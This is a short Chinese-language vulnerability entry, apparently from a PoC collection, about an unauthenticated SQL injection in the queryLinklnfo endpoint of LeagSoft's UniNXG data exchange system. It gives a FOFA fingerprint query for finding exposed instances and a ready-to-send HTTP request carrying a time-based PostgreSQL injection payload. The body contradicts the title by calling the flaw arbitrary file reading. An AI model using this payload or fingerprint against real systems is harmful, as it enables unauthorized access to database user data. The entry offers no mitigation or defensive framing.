# 联软安渡系统接口queryLinklnfo存在SQL注入漏洞

联软安渡UniNXG安全数据交换系统`/UniExServices/link/queryLinklnfo`存在任意文件读取漏洞，未经身份验证的攻击者可利用此漏洞获取数据库用户数据。

## fofa

```yaml
body="深圳市联软科技股份有限公司"
```

## poc

```yaml
GET /UniExServices/link/queryLinklnfo?address=%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close
```

